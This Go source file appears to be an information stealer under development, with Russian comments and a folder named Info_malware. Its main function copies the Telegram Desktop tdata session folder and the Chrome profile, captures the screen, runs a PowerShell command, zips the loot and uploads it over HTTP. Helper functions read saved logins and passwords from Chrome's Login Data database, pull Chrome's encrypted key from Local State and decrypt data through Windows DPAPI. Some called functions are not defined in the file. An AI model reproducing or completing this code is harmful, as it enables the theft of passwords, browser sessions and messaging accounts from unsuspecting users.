package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	_ "modernc.org/sqlite"
)

var (
	modcrypt32             = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData = modcrypt32.NewProc("CryptUnprotectData")
)

func main() {

	ChromeStealer("localhost", "D:\\Info_malware\\chrome.json", false, true)
	res, _ := command_execution("Write-Host 'Hello from PowerShell'")
	fmt.Println(res)
	homeDir, err := os.UserHomeDir()
	if err != nil {
		panic(err)
	}

	captureScreen("D:\\Info_malware\\screen.png")

	tg_sourceFolder := filepath.Join(homeDir, "AppData\\Roaming\\Telegram Desktop\\tdata\\")
	tg_archiveName := "tdata_backup"

	chrome_sourceFolder := filepath.Join(homeDir, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\")
	chrome_archiveName := "data_backup"
	// Путь, где будет сохранена копия папки
	tg_destinationFolder := filepath.Join("D:\\Info_malware", tg_archiveName)
	chrome_destinationFolder := filepath.Join("D:\\Info_malware", chrome_archiveName)
	// Копирование папки
	err = CopyDir(tg_sourceFolder, tg_destinationFolder)
	if err != nil {
		panic(err)
	}
	err = CopyDir(chrome_sourceFolder, chrome_destinationFolder)
	if err != nil {
		panic(err)
	}
	err = ZipFolder("D:\\Info_malware", "C:\\ProgramData\\data.zip")
	if err != nil {
		fmt.Println("Ошибка при создании архива:", err)
	} else {
		fmt.Println("Архив успешно создан.")
	}
	fmt.Println("Копирование и архивация завершены.")

	//res, err := Chrome_SQLite_Reader("D://Info_malware//chrome_data_backup.zip//Login Data")
	//g, _ := get_key_from_local_state()
	//fmt.Println(g, res)

	err_upload := UploadFile("C:\\ProgramData\\data.zip", "http://localhost:5000/upload")
	if err_upload != nil {
		fmt.Println("Ошибка при загрузке файла:", err_upload)
	} else {
		fmt.Println("Файл успешно загружен.")
	}
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

// DPAPIDecrypt расшифровывает данные, используя Windows DPAPI.
func DPAPIDecrypt(encrypted []byte) ([]byte, error) {
	var outBlob DATA_BLOB
	inBlob := DATA_BLOB{
		cbData: uint32(len(encrypted)),
		pbData: &encrypted[0],
	}

	fmt.Println(&encrypted[0])
	r, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if r == 0 {
		fmt.Println("Error in dpapi")
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(uintptr(unsafe.Pointer(outBlob.pbData))))

	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData:outBlob.cbData])

	return decrypted, nil
}

// LoginData представляет запись в таблице logins.
type LoginData struct {
	OriginURL       string
	ActionURL       string
	UsernameElement string
	UsernameValue   string
	PasswordElement string
	PasswordValue   string
	DateCreated     int64
	DateLastUsed    int64
}

// ReadLoginData считывает данные из таблицы logins.
func Chrome_SQLite_Reader(src string) ([]LoginData, error) {
	db, err := sql.Open("sqlite", src)
	if err != nil {
		fmt.Println("Ошибка при открытии базы данных:", err)
		return nil, err
	}

	rows, err := db.Query("SELECT origin_url, action_url, username_element, username_value, password_element, password_value, date_created, date_last_used FROM logins")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var logins []LoginData
	for rows.Next() {
		var ld LoginData
		err := rows.Scan(&ld.OriginURL, &ld.ActionURL, &ld.UsernameElement, &ld.UsernameValue, &ld.PasswordElement, &ld.PasswordValue, &ld.DateCreated, &ld.DateLastUsed)
		if err != nil {
			return nil, err
		}
		logins = append(logins, ld)
	}
	err = rows.Err()
	if err != nil {
		return nil, err
	}

	return logins, nil
}

func get_key_from_local_state() (interface{}, error) {
	var result map[string]interface{}
	dataPath := filepath.Join("C://Users//Саша//AppData//Local//Google//Chrome//User Data//Local State")
	fileData, err := ioutil.ReadFile(dataPath)
	if err != nil {
		return nil, err
	}

	if err := json.Unmarshal(fileData, &result); err != nil {
		return nil, err
	}

	return result["os_crypt"].(map[string]interface{})["encrypted_key"], nil
}

//func get_cipher(key) {
//   cipher := Cipher(
//       algorithms.AES(key),
//      nil,
//      default_backend())
// return cipher
//}
